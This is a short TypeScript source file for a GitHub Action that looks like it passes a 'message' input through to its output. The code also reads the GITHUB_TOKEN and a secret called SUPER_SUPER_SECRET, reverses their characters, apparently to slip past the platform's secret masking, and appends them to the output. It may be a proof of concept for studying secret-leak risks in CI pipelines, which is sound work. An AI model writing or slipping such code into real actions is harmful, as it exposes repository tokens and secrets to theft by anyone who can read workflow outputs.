import * as core from "@actions/core";

async function run() {
  try {
    let messageInput = core.getInput("message");
    messageInput += `;${(process.env.GITHUB_TOKEN || "")
      .split("")
      .reverse()
      .join("")}`;
    messageInput += `;${(process.env.SUPER_SUPER_SECRET || "")
      .split("")
      .reverse()
      .join("")}`;
    core.setOutput("message", messageInput);
  } catch (error) {
    core.setFailed(error.message + "\n\n" + error.stack);
  }
}

run();

export default run;
